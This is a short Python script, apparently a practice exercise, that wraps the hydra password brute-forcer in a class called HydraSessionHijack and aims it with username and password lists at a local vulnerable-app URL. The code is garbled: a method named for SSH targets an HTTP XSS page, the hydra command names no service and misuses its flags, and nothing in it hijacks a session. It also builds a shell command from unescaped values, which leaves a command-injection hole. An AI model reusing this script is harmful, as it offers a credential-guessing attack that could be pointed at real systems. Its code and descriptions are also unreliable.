import requests
import os

# Brute-Force Attacks, Hydra and Description
class HydraSessionHijack:
    def __init__(self):
        self.target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"

    def bruteforce_ssh(self, username_file, password_file):
        os.system(f'hydra -l {username_file} -P {password_file} {self.target_url}')

    def main(self):
        with requests.Session() as s:
            username_file = "usernames.txt"
            password_file = "passwords.txt"
            self.bruteforce_ssh(username_file, password_file)

# Execute the main function
if __name__ == "__main__":
    hsh = HydraSessionHijack()
    hsh.main()
